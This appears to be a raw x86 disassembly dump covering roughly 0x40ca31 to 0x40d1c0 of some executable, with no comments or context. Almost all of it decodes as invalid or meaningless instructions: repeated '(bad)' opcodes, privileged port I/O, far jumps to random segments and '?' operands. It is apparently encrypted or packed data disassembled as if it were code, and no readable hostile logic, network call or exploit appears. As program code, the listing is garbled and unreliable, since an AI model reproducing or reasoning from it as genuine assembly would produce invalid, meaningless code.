  40ca31:	sar    BYTE PTR [ebx],0xb4
  40ca34:	fist   DWORD PTR [edi+0x78]
  40ca37:	jo     0x40ca8a
  40ca39:	mov    eax,ds:0xa8f678ac
  40ca3e:	gs mov ebp,0x53ac538d
  40ca44:	and    ebx,ebp
  40ca46:	nop
  40ca47:	in     eax,0x33
  40ca49:	xor    eax,0x889dea17
  40ca4e:	pusha  
  40ca4f:	icebp  
  40ca50:	or     eax,0xed78beb
  40ca55:	adc    DWORD PTR [ebx-0x70],0x36
  40ca59:	push   ss
  40ca5a:	inc    eax
  40ca5b:	fild   DWORD PTR [esi]
  40ca5d:	div    DWORD PTR [eax]
  40ca5f:	in     eax,dx
  40ca60:	pusha  
  40ca61:	stos   BYTE PTR es:[edi],al
  40ca62:	sub    BYTE PTR [ebx-0x62],bl
  40ca65:	ds leave 
  40ca67:	fwait
  40ca68:	aad    0xc
  40ca6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca6b:	out    0xc,eax
  40ca6d:	imul   esp,DWORD PTR [edi-0x2],0xffffffc7
  40ca71:	cld    
  40ca72:	inc    ecx
  40ca73:	push   0xd20ca919
  40ca78:	sbb    eax,0x286e4f65
  40ca7d:	stos   BYTE PTR es:[edi],al
  40ca7e:	sub    al,0xc6
  40ca80:	or     bh,BYTE PTR [ecx-0x33]
  40ca83:	and    bl,ah
  40ca85:	ds ret 
  40ca87:	push   eax
  40ca88:	adc    DWORD PTR [ebx],eax
  40ca8a:	sbb    ah,al
  40ca8c:	fbstp  TBYTE PTR [ebx]
  40ca8e:	call   0x4b324c88
  40ca93:	fcomp  st(1)
  40ca95:	(bad)  
  40ca96:	pop    ss
  40ca97:	sbb    DWORD PTR [ebp-0x3bd270f7],ebx
  40ca9d:	test   al,0xb
  40ca9f:	mov    di,dx
  40caa2:	jo     0x40ca3d
  40caa4:	pop    ds
  40caa5:	test   BYTE PTR [esi-0x6d68dcc5],dl
  40caab:	xchg   ecx,eax
  40caac:	xlat   BYTE PTR ds:[ebx]
  40caad:	push   edi
  40caae:	(bad)  
  40caaf:	(bad)  
  40cab0:	mov    esi,0xe264ef02
  40cab5:	cmp    DWORD PTR [ecx+0x5f],esp
  40cab8:	cmp    dh,bh
  40caba:	aas    
  40cabb:	les    ebp,FWORD PTR [ebp-0x40]
  40cabe:	icebp  
  40cabf:	aad    0xc6
  40cac1:	or     BYTE PTR [ebx+0x71],dh
  40cac4:	loop   0x40cab7
  40cac6:	(bad)  
  40cac7:	cdq    
  40cac8:	mov    dl,0x23
  40caca:	jns    0x40caa0
  40cacc:	push   eax
  40cacd:	es sub al,0xb8
  40cad0:	cmp    esi,DWORD PTR [ecx+edi*1+0x34f95878]
  40cad7:	jno    0x40cabb
  40cad9:	adc    al,0xaf
  40cadb:	pop    edi
  40cadc:	sub    BYTE PTR [esi],0xd0
  40cadf:	mov    al,0xaa
  40cae1:	mov    eax,ebp
  40cae3:	ficom  WORD PTR [ecx+0x3cbbde28]
  40cae9:	push   es
  40caea:	js     0x40cb51
  40caec:	call   0x4619:0xe53ae91b
  40caf3:	xchg   bp,ax
  40caf5:	mov    tr1,esi
  40caf8:	cmp    eax,0x429e3467
  40cafd:	cmp    BYTE PTR [ebp+0x5a],ah
  40cb00:	sqrtps xmm3,xmm1
  40cb03:	scas   al,BYTE PTR es:[edi]
  40cb04:	inc    ebp
  40cb05:	mov    ch,BYTE PTR [ebp+0x65703da0]
  40cb0b:	sbb    cl,BYTE PTR [eax]
  40cb0d:	int3   
  40cb0e:	jmp    0xbb920252
  40cb13:	xchg   ebp,eax
  40cb14:	sub    DWORD PTR [ebx-0x607e03f1],0xffffffd8
  40cb1b:	inc    ebp
  40cb1c:	adc    eax,0xc3a6dd
  40cb21:	int    0x37
  40cb23:	lods   eax,DWORD PTR ds:[esi]
  40cb24:	(bad)  
  40cb25:	popa   
  40cb26:	inc    esi
  40cb27:	jp     0x40cb5d
  40cb29:	xor    eax,0x25533bf8
  40cb2e:	push   ss
  40cb2f:	add    BYTE PTR es:[ecx-0x745da6b8],0xae
  40cb37:	mov    ebx,0x12446894
  40cb3c:	or     BYTE PTR [edx],dl
  40cb3e:	xor    BYTE PTR [ebp-0x2d],ah
  40cb41:	add    ebp,DWORD PTR ds:0x7a09035e
  40cb47:	data16 add bl,BYTE PTR [eax-0x2a]
  40cb4b:	jb     0x40cb22
  40cb4d:	ds mov ecx,0x56ce5380
  40cb53:	iret   
  40cb54:	mov    eax,ds:0x4f552657
  40cb59:	mov    BYTE PTR [ebp-0x72b1331b],0x34
  40cb60:	jmp    0x11ef:0xcd41a36b
  40cb67:	mov    BYTE PTR [bp+si],ah
  40cb6a:	cmp    ebp,DWORD PTR [eax]
  40cb6c:	loopne 0x40cbe4
  40cb6e:	pusha  
  40cb6f:	pusha  
  40cb70:	idiv   DWORD PTR [edx-0x4b]
  40cb73:	mov    al,ds:0x18264c82
  40cb78:	and    eax,DWORD PTR [ebx+0x37]
  40cb7b:	xor    BYTE PTR [edi+0x1a],0x48
  40cb7f:	pop    edi
  40cb80:	out    dx,al
  40cb81:	call   0x9f8b:0xa4ddfbf
  40cb88:	mov    ebp,DWORD PTR [ecx+edi*4]
  40cb8b:	pop    ss
  40cb8c:	test   al,0x30
  40cb8e:	inc    edi
  40cb8f:	ja     0x40cbd6
  40cb91:	push   edx
  40cb92:	push   esi
  40cb93:	inc    ebx
  40cb94:	outs   dx,DWORD PTR ds:[esi]
  40cb95:	lods   eax,DWORD PTR ds:[esi]
  40cb96:	xchg   edi,eax
  40cb97:	xchg   ebp,eax
  40cb98:	adc    al,al
  40cb9a:	enter  0x3a38,0xc6
  40cb9e:	sbb    eax,0xa53521ae
  40cba3:	fwait
  40cba4:	xchg   edi,eax
  40cba5:	inc    esi
  40cba6:	shl    bh,cl
  40cba8:	pusha  
  40cba9:	jmp    0x40cbac
  40cbab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbac:	sub    eax,DWORD PTR [eax-0x709c6559]
  40cbb2:	mov    bh,0xa4
  40cbb4:	ret    0xe6d6
  40cbb7:	lods   eax,DWORD PTR ds:[esi]
  40cbb8:	inc    ebx
  40cbb9:	das    
  40cbba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbbb:	mul    al
  40cbbd:	pop    es
  40cbbe:	cmp    eax,0x2fbd5fde
  40cbc3:	ja     0x40cbf7
  40cbc5:	imul   eax,DWORD PTR [esi-0x5108a121],0xebb7ad74
  40cbcf:	ins    DWORD PTR es:[edi],dx
  40cbd0:	cmp    al,0x1
  40cbd2:	scas   al,BYTE PTR es:[edi]
  40cbd3:	out    dx,al
  40cbd4:	sub    DWORD PTR [edx],0xa4e09133
  40cbda:	pop    edx
  40cbdb:	lea    edx,[edx-0x44]
  40cbde:	out    0x43,al
  40cbe0:	jae    0x40cc18
  40cbe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbe3:	add    BYTE PTR [esi-0x198fe3f6],cl
  40cbe9:	popf   
  40cbea:	leave  
  40cbeb:	jl     0x40cc07
  40cbed:	sub    al,0x3b
  40cbef:	ja     0x40cbda
  40cbf1:	bswap  edi
  40cbf3:	adc    al,0xf3
  40cbf5:	adc    DWORD PTR [ebx],eax
  40cbf7:	arpl   cx,bx
  40cbf9:	stos   BYTE PTR es:[edi],al
  40cbfa:	stc    
  40cbfb:	dec    ebp
  40cbfc:	je     0x40cb8c
  40cbfe:	adc    BYTE PTR [ecx+eax*4-0x67],ch
  40cc02:	inc    ecx
  40cc03:	mov    ebx,0x853e314e
  40cc08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc09:	sbb    esp,DWORD PTR [ecx+eax*8+0x60]
  40cc0d:	fucomip st,st(3)
  40cc0f:	mov    DWORD PTR [esi+0x29],ebx
  40cc12:	cmp    al,0x9e
  40cc14:	add    bl,ah
  40cc16:	inc    ebx
  40cc17:	popf   
  40cc18:	inc    esi
  40cc19:	jno    0x40cc92
  40cc1b:	mov    eax,0x83ea3439
  40cc20:	mov    ds:0x731f60ab,eax
  40cc25:	xor    al,0x8c
  40cc27:	adc    DWORD PTR [edx-0x41],esp
  40cc2a:	aas    
  40cc2b:	mov    ss,WORD PTR [ebp+0x61997c9e]
  40cc31:	add    ecx,DWORD PTR [esi+0x5e62b85e]
  40cc37:	add    eax,0x2929c83a
  40cc3c:	ds or  al,0x19
  40cc3f:	mov    edi,0x6efe20dc
  40cc44:	in     al,dx
  40cc45:	pop    ss
  40cc46:	outs   dx,BYTE PTR ds:[esi]
  40cc47:	pop    ecx
  40cc48:	fstp   QWORD PTR [esi+0x52fff4db]
  40cc4e:	loop   0x40cc5b
  40cc50:	lods   al,BYTE PTR ds:[esi]
  40cc51:	ja     0x40cbf2
  40cc53:	add    bh,BYTE PTR [ecx+0x16]
  40cc56:	scas   al,BYTE PTR es:[edi]
  40cc57:	pop    esi
  40cc58:	clc    
  40cc59:	cmp    eax,0xc18f5ed2
  40cc5e:	cwde   
  40cc5f:	mov    ebp,0xa97ecc47
  40cc64:	or     dl,BYTE PTR [ebx]
  40cc66:	jno    0x40cc9d
  40cc68:	lds    edi,FWORD PTR [ecx]
  40cc6a:	mov    eax,0x9ea14a69
  40cc6f:	cwde   
  40cc70:	out    0xce,eax
  40cc72:	jg     0x40ccc4
  40cc74:	mov    ecx,0x8e9dd2d7
  40cc79:	jb     0x40cc4d
  40cc7b:	push   esp
  40cc7c:	arpl   WORD PTR [edi-0x65cdf111],cx
  40cc82:	inc    esi
  40cc83:	xchg   ecx,eax
  40cc84:	outs   dx,DWORD PTR ds:[esi]
  40cc85:	inc    eax
  40cc86:	rcr    BYTE PTR [eax+0x2b725019],0xa
  40cc8d:	jle    0x40cc34
  40cc8f:	or     dl,BYTE PTR [esi+0x3f348197]
  40cc95:	dec    edi
  40cc96:	add    al,0xe
  40cc98:	pop    es
  40cc99:	mov    ecx,0xed9a36c
  40cc9e:	pop    ecx
  40cca0:	jmp    0x40cd15
  40cca2:	es jo  0x40cc7f
  40cca5:	dec    edi
  40cca6:	add    al,0xa1
  40cca8:	cmp    DWORD PTR [esi+0x2c],ebx
  40ccab:	add    eax,0x2bb0f402
  40ccb0:	jge    0x40cc79
  40ccb2:	test   esp,eax
  40ccb4:	test   eax,0xb8bb31e9
  40ccb9:	dec    esi
  40ccba:	sub    eax,0x3901ca32
  40ccbf:	jo     0x40cc7e
  40ccc1:	xor    al,0x9f
  40ccc3:	pop    esp
  40ccc4:	sti    
  40ccc5:	and    dh,BYTE PTR [edx]
  40ccc7:	add    ecx,ecx
  40ccc9:	push   edx
  40ccca:	repz test eax,0xe9b5456a
  40ccd0:	call   0xa385:0x50ae0baf
  40ccd7:	push   ebp
  40ccd8:	xor    DWORD PTR [ebx-0xd211be8],edx
  40ccde:	push   esp
  40ccdf:	sub    BYTE PTR [esi-0x43992fc2],0x29
  40cce6:	push   esi
  40cce7:	jl     0x40ccc4
  40cce9:	dec    edx
  40ccea:	mov    eax,ds:0x2188b85
  40ccef:	jp     0x40ccb8
  40ccf1:	xor    esp,ebx
  40ccf3:	mov    ?,WORD PTR [eax+0x1d]
  40ccf6:	cdq    
  40ccf7:	mov    ebp,DWORD PTR [ebp+0x18]
  40ccfa:	mov    ss,WORD PTR [ecx]
  40ccfc:	inc    ecx
  40ccfd:	aas    
  40ccfe:	in     eax,0x7c
  40cd00:	out    dx,eax
  40cd01:	push   es
  40cd02:	fwait
  40cd03:	addr16 int 0x7
  40cd06:	xchg   ecx,edi
  40cd08:	fld    DWORD PTR [ebx]
  40cd0a:	enter  0x91d6,0x93
  40cd0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd0f:	dec    esp
  40cd10:	ret    0xf4b9
  40cd13:	pop    esp
  40cd14:	or     BYTE PTR [esi+0xf01a21d],0x41
  40cd1b:	pop    edi
  40cd1c:	sbb    eax,0x3eb86a2
  40cd21:	xor    BYTE PTR [eax-0x3bedfc5d],0x31
  40cd28:	inc    edi
  40cd29:	adc    bl,BYTE PTR [edx-0x55]
  40cd2c:	pop    edi
  40cd2d:	inc    edx
  40cd2e:	mov    edx,0xa5b44c8f
  40cd33:	mov    eax,ds:0xb848ddc
  40cd38:	mov    dh,0x68
  40cd3a:	mov    cl,0x48
  40cd3c:	in     al,dx
  40cd3d:	cwde   
  40cd3e:	js     0x40cd5c
  40cd40:	popf   
  40cd41:	xor    ebp,DWORD PTR [ebx]
  40cd43:	ins    DWORD PTR es:[edi],dx
  40cd44:	ret    
  40cd45:	or     DWORD PTR [esi],eax
  40cd47:	aam    0xba
  40cd49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd4a:	pop    ss
  40cd4b:	pop    ebx
  40cd4c:	pop    esi
  40cd4d:	mov    bl,0xdc
  40cd4f:	pusha  
  40cd50:	inc    edx
  40cd51:	cmp    DWORD PTR [ebx+0x1a],0xffffff89
  40cd55:	or     BYTE PTR [esi-0x30dbbff4],0xba
  40cd5c:	aad    0x42
  40cd5e:	enter  0x3cdc,0x26
  40cd62:	sbb    DWORD PTR [edi],eax
  40cd64:	in     al,dx
  40cd65:	jmp    0x6c88:0xb7e08a8f
  40cd6c:	mov    esp,0x6dce1d60
  40cd71:	outs   dx,DWORD PTR ds:[esi]
  40cd72:	test   eax,edi
  40cd74:	push   ss
  40cd75:	cmp    eax,0x5eb49bc1
  40cd7a:	(bad)  
  40cd7c:	cld    
  40cd7d:	out    0x85,al
  40cd7f:	pop    ebp
  40cd80:	add    al,BYTE PTR [esi+0x22eb5d01]
  40cd86:	and    DWORD PTR [ebx-0x3195f5a0],eax
  40cd8c:	jae    0x40cd21
  40cd8e:	mov    ah,0x66
  40cd90:	data16 (bad) 
  40cd92:	adc    dl,BYTE PTR [edi-0x79]
  40cd95:	ds mov cl,0x25
  40cd98:	xor    ch,BYTE PTR [eax]
  40cd9a:	cmc    
  40cd9b:	loope  0x40cdf8
  40cd9d:	test   al,0x9c
  40cd9f:	mov    ecx,0xee489a5b
  40cda4:	(bad)  
  40cda5:	mov    ?,WORD PTR [edi]
  40cda7:	jno    0x40cda9
  40cda9:	or     eax,0xa653764e
  40cdae:	(bad)  
  40cdaf:	pushf  
  40cdb0:	jo     0x40cd49
  40cdb2:	pop    ecx
  40cdb3:	retf   0x65cd
  40cdb6:	scas   eax,DWORD PTR es:[edi]
  40cdb7:	aad    0x93
  40cdb9:	mov    ebx,0xaf7381b
  40cdbe:	cmp    al,0x8e
  40cdc0:	popf   
  40cdc1:	outs   dx,DWORD PTR ds:[esi]
  40cdc2:	enter  0xff2a,0x7a
  40cdc6:	cmp    BYTE PTR [edi+0x59],dl
  40cdc9:	and    eax,0xc9e42b0a
  40cdce:	ds pop edx
  40cdd0:	cmp    cl,BYTE PTR [eax+0x3b8799f]
  40cdd6:	and    eax,ebp
  40cdd8:	pusha  
  40cdd9:	dec    esi
  40cdda:	lds    edx,FWORD PTR [esi-0x38]
  40cddd:	push   eax
  40cdde:	int    0x8e
  40cde0:	add    ecx,DWORD PTR [esi]
  40cde2:	pop    ss
  40cde3:	jmp    0xba612d59
  40cde8:	add    DWORD PTR [edx-0x7c01f721],0xb64f85c1
  40cdf2:	dec    eax
  40cdf3:	lds    esp,FWORD PTR [ebp+0x2]
  40cdf6:	stos   DWORD PTR es:[edi],eax
  40cdf7:	jns    0x40cd9c
  40cdf9:	pop    ebx
  40cdfa:	shl    BYTE PTR [edx-0x5ccfe7c],cl
  40ce00:	leave  
  40ce01:	(bad)
  40ce04:	daa    
  40ce05:	or     eax,DWORD PTR [esi]
  40ce07:	push   esp
  40ce08:	xor    al,0x8
  40ce0a:	enter  0x11b4,0x6c
  40ce0e:	sbb    eax,0x539bdef1
  40ce13:	sbb    BYTE PTR [edi+0x17974b30],0xe8
  40ce1a:	es inc edx
  40ce1c:	fistp  DWORD PTR [ecx]
  40ce1e:	repz pop ebx
  40ce20:	mov    ds:0x44af35c6,eax
  40ce25:	mov    bh,0x1b
  40ce27:	adc    al,0x32
  40ce2a:	shr    DWORD PTR [ebx+eax*4+0xceba0df],0xaf
  40ce32:	adc    DWORD PTR [ebx],ecx
  40ce34:	ret    0x6d7f
  40ce37:	jmp    DWORD PTR [edi-0x68]
  40ce3a:	mov    eax,0xd4030fe5
  40ce3f:	sub    ch,0x5b
  40ce42:	pusha  
  40ce43:	test   BYTE PTR [ebx-0x17],dl
  40ce46:	sub    eax,0x86bfd8f7
  40ce4b:	xor    dl,BYTE PTR [edx]
  40ce4d:	jno    0x40ce79
  40ce4f:	aaa    
  40ce50:	arpl   di,si
  40ce52:	inc    edi
  40ce53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce55:	or     ecx,DWORD PTR [ebp+0x394e1fad]
  40ce5b:	cmp    cl,ah
  40ce5d:	retf   0xe18e
  40ce60:	cmp    al,0x15
  40ce62:	mov    ds:0x269a3c04,al
  40ce67:	mov    eax,ds:0x8cecf68f
  40ce6c:	add    eax,0x51f908a0
  40ce71:	sub    edi,ebx
  40ce73:	push   cs
  40ce74:	sub    al,0x86
  40ce76:	cmp    bh,BYTE PTR [eax]
  40ce78:	fimul  DWORD PTR ds:0x25b4361f
  40ce7e:	and    al,0xc6
  40ce80:	iret   
  40ce81:	into   
  40ce82:	bound  ebp,QWORD PTR [esi+0x2d3f696a]
  40ce88:	mov    cl,0x20
  40ce8a:	sahf   
  40ce8b:	jno    0x40ce78
  40ce8d:	sbb    DWORD PTR [ebx-0x9],edi
  40ce90:	sub    DWORD PTR [ebx-0x61adf041],eax
  40ce96:	mov    eax,ds:0xdea3059a
  40ce9b:	push   edx
  40ce9c:	xchg   DWORD PTR [eax+0x5fba4f1c],ebx
  40cea2:	sub    BYTE PTR [esi+0x4c],cl
  40cea5:	xchg   edi,eax
  40cea6:	fisub  DWORD PTR [eax-0x20]
  40cea9:	mov    DWORD PTR [esi+0x39],esi
  40ceac:	jbe    0x40ce95
  40ceae:	jmp    FWORD PTR gs:[edx+0x775c3db1]
  40ceb5:	nop
  40ceb6:	xor    cl,al
  40ceb8:	inc    esi
  40ceb9:	call   0x93781b6b
  40cebe:	mov    ds:0x156d7d1,al
  40cec3:	test   BYTE PTR [edx+0x65],ah
  40cec6:	or     eax,0x54e917bb
  40cecb:	retf   0xa528
  40cece:	hlt    
  40cecf:	add    ecx,DWORD PTR [edx+edx*2+0x1add2bc8]
  40ced6:	(bad)  
  40ced7:	gs mov ebp,0xec3402a1
  40cedd:	add    al,0x55
  40cedf:	stc    
  40cee0:	push   ss
  40cee1:	and    DWORD PTR [ebx-0x90163fd],esp
  40cee7:	lock cmc 
  40cee9:	dec    ebp
  40ceea:	(bad)  
  40ceeb:	sti    
  40ceec:	(bad)  
  40ceed:	icebp  
  40ceee:	sub    al,0x85
  40cef0:	cmp    eax,0x650908f1
  40cef5:	cmp    eax,0xb4614eab
  40cefa:	adc    esp,DWORD PTR cs:[bx+si]
  40cefe:	into   
  40ceff:	inc    esp
  40cf00:	cs ss xor eax,0xd7485fc3
  40cf07:	adc    al,0x3f
  40cf09:	(bad)  
  40cf0a:	mov    DWORD PTR [ebx+edx*1-0x534953c6],ebx
  40cf11:	lahf   
  40cf12:	adc    eax,0x9d498ce3
  40cf17:	cmc    
  40cf18:	(bad)  
  40cf19:	pop    ss
  40cf1a:	push   edx
  40cf1b:	push   es
  40cf1c:	inc    ecx
  40cf1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf1e:	mov    edx,0x3aef0e9a
  40cf23:	loope  0x40cf95
  40cf25:	push   cs
  40cf26:	inc    ebx
  40cf27:	adc    eax,0xafc5cfde
  40cf2c:	retf   0x79df
  40cf2f:	int    0x4d
  40cf31:	aaa    
  40cf32:	ss es mov ah,0x64
  40cf36:	mov    ebp,DWORD PTR [ebx+ebp*8]
  40cf39:	lock fild QWORD PTR [ebx+0x14]
  40cf3d:	sbb    al,0xc
  40cf3f:	in     eax,0xd4
  40cf41:	inc    ebp
  40cf42:	inc    ecx
  40cf43:	ss aad 0x20
  40cf46:	lds    eax,FWORD PTR [eax+0x63]
  40cf49:	rcl    DWORD PTR [ebx-0x36],cl
  40cf4c:	add    bl,ah
  40cf4e:	xchg   ebx,eax
  40cf4f:	cdq    
  40cf50:	dec    edi
  40cf51:	(bad)  
  40cf52:	test   cl,0xbc
  40cf55:	mov    cs,WORD PTR [eax]
  40cf57:	lock mov ds:0x129ff466,eax
  40cf5d:	lock pusha 
  40cf5f:	pop    esp
  40cf60:	add    DWORD PTR [edi],ecx
  40cf62:	xchg   ebp,eax
  40cf63:	fistp  WORD PTR [eax+0x438fd386]
  40cf69:	push   cs
  40cf6a:	lods   al,BYTE PTR ds:[esi]
  40cf6b:	mov    esi,0xc5a00620
  40cf70:	retf   0x11f3
  40cf73:	jl     0x40cf8d
  40cf75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf76:	pop    esp
  40cf77:	dec    ecx
  40cf78:	or     DWORD PTR [edi+0x3],edi
  40cf7b:	shl    DWORD PTR [ebx],1
  40cf7d:	ror    DWORD PTR [ebx+0x4340141d],cl
  40cf83:	add    BYTE PTR [ecx],cl
  40cf85:	sbb    eax,0x436018
  40cf8a:	mov    DWORD PTR [ebp-0x50],edx
  40cf8d:	mov    edx,DWORD PTR [ebp+0x8]
  40cf90:	mov    ebx,DWORD PTR ds:0x434020
  40cf96:	sbb    DWORD PTR ds:0x43401c,ebx
  40cf9c:	mov    ebx,DWORD PTR [ebp-0x4c]
  40cf9f:	jmp    0x40f353
  40cfa4:	mov    DWORD PTR [edi+0x2c],0x73f3ac7a
  40cfab:	ret    
  40cfac:	xchg   esp,eax
  40cfad:	cs or  al,0xd2
  40cfb0:	call   0x7ce2:0x65de88ad
  40cfb7:	jl     0x40cfa4
  40cfb9:	pop    edi
  40cfba:	jl     0x40d038
  40cfbc:	mov    cl,0xdf
  40cfbe:	mov    al,ds:0xb9d98ae
  40cfc3:	dec    eax
  40cfc4:	mov    es,WORD PTR cs:[bp+si]
  40cfc8:	in     eax,dx
  40cfc9:	inc    bh
  40cfcb:	or     esp,DWORD PTR [esi+0x4da62719]
  40cfd1:	xor    BYTE PTR [ebx+0x4d8ede7b],0x98
  40cfd8:	adc    BYTE PTR [esi+0x4eec42cd],dl
  40cfde:	fidivr WORD PTR [ebp+0x5356a773]
  40cfe4:	jo     0x40d057
  40cfe6:	push   esi
  40cfe7:	loopne 0x40cfea
  40cfe9:	les    ebx,FWORD PTR [ebp-0x16d86a68]
  40cfef:	jbe    0x40d008
  40cff1:	fild   QWORD PTR [ebp+0x742a3d18]
  40cff7:	enter  0xb04e,0x63
  40cffb:	stc    
  40cffc:	je     0x40d041
  40cffe:	inc    ecx
  40cfff:	pop    edx
  40d000:	cmp    eax,0xe0edb0c0
  40d005:	jno    0x40d07a
  40d007:	pushf  
  40d008:	ins    DWORD PTR es:[edi],dx
  40d009:	cmp    ecx,DWORD PTR [ecx+edx*8]
  40d00c:	mov    al,ds:0xfafda595
  40d011:	fild   WORD PTR [eax+0x77]
  40d014:	and    BYTE PTR [ebp+0x36f626d2],0x89
  40d01b:	scas   al,BYTE PTR es:[edi]
  40d01c:	aam    0x30
  40d01e:	cmc    
  40d01f:	imul   ebp,DWORD PTR [ecx],0xe5ca6549
  40d025:	dec    ebp
  40d026:	xchg   edi,eax
  40d027:	sbb    ebx,eax
  40d029:	ds aas 
  40d02b:	mov    ah,0xe4
  40d02d:	and    dl,al
  40d02f:	add    BYTE PTR [esi+ebp*4+0x52],al
  40d033:	mov    al,ds:0xad2aed54
  40d038:	xchg   ebx,eax
  40d039:	stos   BYTE PTR es:[edi],al
  40d03a:	inc    edx
  40d03b:	es leave 
  40d03d:	xor    dl,BYTE PTR ds:0x3dffb3b6
  40d043:	aaa    
  40d044:	xlat   BYTE PTR ds:[ebx]
  40d045:	seta   BYTE PTR [esi]
  40d048:	and    BYTE PTR [ecx],ah
  40d04a:	rcr    BYTE PTR [esi],0x67
  40d04d:	mov    bh,0x7d
  40d04f:	je     0x40d03c
  40d051:	int3   
  40d052:	xchg   ebx,eax
  40d053:	mov    ch,0xc3
  40d055:	repz xor eax,0xe3edde1c
  40d05b:	cmp    cl,cl
  40d05d:	or     dl,BYTE PTR [eax]
  40d05f:	out    0x2e,eax
  40d061:	sub    eax,0x846dd188
  40d066:	pop    ebx
  40d067:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d068:	inc    esp
  40d069:	xor    dh,BYTE PTR [eax]
  40d06b:	cld    
  40d06c:	popf   
  40d06d:	and    eax,DWORD PTR cs:[edx-0x3b81ddbc]
  40d074:	lahf   
  40d075:	push   esp
  40d076:	ins    BYTE PTR es:[edi],dx
  40d077:	cdq    
  40d078:	repnz dec esp
  40d07a:	mov    ah,0x75
  40d07c:	push   ebp
  40d07d:	in     eax,0xb6
  40d07f:	in     al,dx
  40d080:	icebp  
  40d081:	push   ss
  40d082:	lea    ecx,[ebp-0x36]
  40d085:	(bad)  
  40d086:	inc    ebx
  40d087:	neg    dl
  40d089:	cmp    eax,0x96302912
  40d08e:	sub    al,ch
  40d090:	das    
  40d091:	aas    
  40d092:	sub    al,BYTE PTR [esi]
  40d094:	loope  0x40d078
  40d096:	loop   0x40d0cc
  40d098:	xlat   BYTE PTR ds:[ebx]
  40d099:	bound  ebx,QWORD PTR [eax+0x7f]
  40d09c:	and    al,0x5e
  40d09e:	and    edx,DWORD PTR [ecx]
  40d0a0:	and    esp,DWORD PTR [ebx]
  40d0a2:	and    ecx,esp
  40d0a4:	and    DWORD PTR [ecx],ecx
  40d0a6:	add    ch,BYTE PTR [eax-0x93a3cb7]
  40d0ac:	outs   dx,BYTE PTR ds:[esi]
  40d0ad:	pop    ds
  40d0ae:	adc    edx,DWORD PTR [ecx]
  40d0b0:	js     0x40d0e4
  40d0b2:	or     DWORD PTR [esi],0x3175211e
  40d0b8:	maxps  xmm6,XMMWORD PTR [ecx-0x15]
  40d0bc:	mov    al,0xf9
  40d0be:	out    0xb4,eax
  40d0c0:	push   ds
  40d0c1:	add    BYTE PTR [ebx],ch
  40d0c3:	inc    esi
  40d0c4:	les    ebp,FWORD PTR [eax-0x592aef75]
  40d0ca:	push   cs
  40d0cb:	jns    0x40d0bf
  40d0cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0ce:	xor    al,0xbd
  40d0d0:	dec    ebx
  40d0d1:	inc    esp
  40d0d2:	xchg   ebx,eax
  40d0d3:	into   
  40d0d4:	xor    DWORD PTR [ebx-0x16],0xffffffba
  40d0d8:	jmp    0x6c09132d
  40d0dd:	push   0x7b8ffddf
  40d0e2:	sti    
  40d0e3:	mov    esp,0xc6255ea
  40d0e8:	cs addr16 jle 0x40d090
  40d0ec:	in     ax,dx
  40d0ee:	cmp    BYTE PTR [ebp+0x414c6d1e],ah
  40d0f4:	fistp  WORD PTR [ebp+0x21]
  40d0f7:	add    esi,esp
  40d0f9:	push   ecx
  40d0fa:	pop    esi
  40d0fb:	(bad)  
  40d0fc:	cmp    al,0x29
  40d0fe:	repz cmova ecx,DWORD PTR [edx+edx*8]
  40d103:	mov    cl,0x6d
  40d105:	idiv   bl
  40d107:	mov    DWORD PTR [ecx],esi
  40d109:	ror    DWORD PTR [edx+0x3],cl
  40d10c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d10d:	clc    
  40d10e:	or     eax,0x84f54ae4
  40d113:	xor    BYTE PTR [eax],bh
  40d115:	popf   
  40d116:	mov    ds:0x987a2135,eax
  40d11b:	mov    edi,0xa21e6e3d
  40d120:	popw   ds
  40d122:	es mov dh,0xe2
  40d125:	inc    edi
  40d126:	jbe    0x40d0dc
  40d128:	dec    ebx
  40d129:	jp     0x40d15a
  40d12b:	inc    eax
  40d12c:	ret    
  40d12d:	mov    DWORD PTR [ebx+0x3abfd1e5],esp
  40d133:	mov    bh,0x90
  40d135:	push   0x5f
  40d137:	push   es
  40d138:	mov    ecx,0x324b93be
  40d13d:	cmp    ebx,ebp
  40d13f:	jmp    0xf4a44d
  40d144:	push   esi
  40d145:	loope  0x40d1a3
  40d147:	mov    cl,0x9f
  40d149:	pop    ss
  40d14a:	sbb    eax,0xf4ffa45e
  40d14f:	xchg   esp,eax
  40d150:	imul   ecx,esi,0x66acd0d5
  40d156:	repz cmp ecx,edx
  40d159:	cwde   
  40d15a:	stos   BYTE PTR es:[edi],al
  40d15b:	push   0xffffffd5
  40d15d:	mov    DWORD PTR [ebx+edx*4-0x445b95e],0x20532e41
  40d168:	call   0xa5009654
  40d16d:	fmul   QWORD PTR [edi*4-0x3cdeafd2]
  40d174:	or     BYTE PTR [edx+0x3d3ce7fd],al
  40d17a:	sub    eax,0x3aa2a45b
  40d17f:	cmp    esp,edx
  40d181:	aad    0xc2
  40d183:	push   ebx
  40d184:	sub    al,0xb0
  40d186:	mov    ds:0x35588aa,eax
  40d18b:	xor    eax,0xab97b583
  40d190:	or     dh,dl
  40d192:	popf   
  40d193:	in     eax,dx
  40d194:	push   0x4779ec42
  40d199:	jl     0x40d1dd
  40d19b:	and    eax,0x77465e2b
  40d1a0:	enter  0x8779,0x88
  40d1a4:	sar    BYTE PTR [eax+0x3d0d31e9],cl
  40d1aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1ab:	mov    al,0x33
  40d1ad:	jnp    0x40d1c1
  40d1af:	jnp    0x40d1f4
  40d1b1:	call   0x1c:0x7a3cc710
  40d1b8:	or     cl,BYTE PTR [edx+0x2fa63a38]
  40d1be:	into   
  40d1bf:	(bad)  
  40d1c0:	jp     0x40d18b
